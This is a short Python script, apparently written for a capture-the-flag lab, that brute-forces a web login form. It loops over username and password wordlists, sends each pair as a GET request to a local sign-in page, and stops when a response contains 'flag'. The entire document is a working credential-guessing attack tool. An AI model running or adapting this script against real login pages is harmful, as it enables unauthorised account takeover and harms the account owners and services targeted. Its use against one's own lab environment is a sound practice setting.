import requests

# Base URL of the login page
base_url = "http://127.0.0.1:8080/?page=signin&username={}&password={}&Login=Login#"

# Function to read usernames from a text file
def load_usernames(file_path):
    with open(file_path, 'r') as file:
        usernames = file.read().splitlines()
    return usernames

# Function to read passwords from a text file
def load_passwords(file_path):
    with open(file_path, 'r') as file:
        passwords = file.read().splitlines()
    return passwords

# Load usernames and passwords from the text files
usernames = load_usernames('common_usernames.txt')
passwords = load_passwords('common_passwords.txt')

# Iterate over each username and password combination
for username in usernames:
    for password in passwords:
        # Construct the login URL with username and password as parameters
        login_url = base_url.format(username, password)

        # Send a GET request to the login URL
        response = requests.get(login_url)

        # Check if the response contains the string "flag"
        if "flag" in response.text:
            yellow_color = "\033[93m"
            print(yellow_color + f"Flag found for {username} with password: {password}")
            exit()  

        # If login fails, print a message and continue to the next password
        else:
            print(f"Failed login for {username} with password: {password}")

print("Brute force testing completed.")
